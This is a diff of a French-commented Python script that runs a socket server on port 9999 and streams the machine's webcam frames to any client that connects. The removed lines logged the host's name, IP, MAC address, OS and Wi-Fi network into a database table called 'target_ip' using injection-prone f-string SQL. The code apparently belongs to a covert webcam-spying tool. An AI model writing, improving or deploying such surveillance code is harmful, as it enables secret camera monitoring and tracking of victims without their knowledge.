@@ -7,6 +7,7 @@ import mysql.connector
 import platform
 from getmac import get_mac_address
 import subprocess
+import time
 
 def get_system_info_ext():
     # Nom d'hôte
@@ -22,7 +23,6 @@ def get_system_info_ext():
     # Affichage des résultats
     computer_data = [host_name, ip_address, mac_address, os_name, os_version]
     return computer_data
-
 
 def get_connected_wifi_network():
     try:
@@ -56,35 +56,20 @@ def close_connection(conn):
 host_ip = socket.gethostbyname(socket.gethostname())
 port = 9999
 
-conn = connect_to_database()
-if conn:
-    try:
-        cursor = conn.cursor()
-        
-        cursor.execute(f'SELECT COUNT(*) FROM target_ip WHERE ip = "{host_ip}" AND network = "{get_connected_wifi_network()}"')
-        row_count = cursor.fetchone()[0]
-        
-        if row_count == 0:
-            cursor.execute(f'INSERT INTO target_ip (`ip`, `computers_data`, `network`, `date`) VALUES ("{host_ip}", "{get_system_info_ext()}", "{get_connected_wifi_network()}", NOW())')
-            conn.commit()        
-        cursor.close()
-    finally:
-        close_connection(conn)
-
-# Configuration de la caméra
-cap = cv2.VideoCapture(0)
+# Création du socket serveur
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((host_ip, port))
+s.listen(1)
+print(f"Serveur démarré sur {host_ip}:{port}")
 
 while True:
     try:
-        # Création du socket serveur
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((host_ip, port))
-        s.listen(1)
-        print(f"Serveur démarré sur {host_ip}:{port}")
-
         # Accepter la connexion entrante
         conn_lh, addr = s.accept()
         print(f"Connexion établie avec {addr}")
+
+        # Configuration de la caméra
+        cap = cv2.VideoCapture(0)
 
         while True:
             ret, frame = cap.read()
@@ -94,10 +79,13 @@ while True:
                 # Envoi des données au client
                 conn_lh.sendall(struct.pack("L", len(data)) + data)
     except (socket.error, ConnectionResetError):
-        print("La connexion a été interrompue. Tentative de reconnexion dans 5 secondes...")
-        time.sleep(5)  # Attendre 5 secondes avant de réessayer
+        print("La connexion a été interrompue. Tentative de reconnexion dans 1 secondes...")
+        time.sleep(1)  # Attendre 5 secondes avant de réessayer
         continue
     finally:
         # Fermeture de la connexion et de la caméra
-        conn_lh.close()
-        cap.release()
+        if conn_lh:
+            conn_lh.close()
+        time.sleep(0.5)
+        if cap:
+            cap.release()
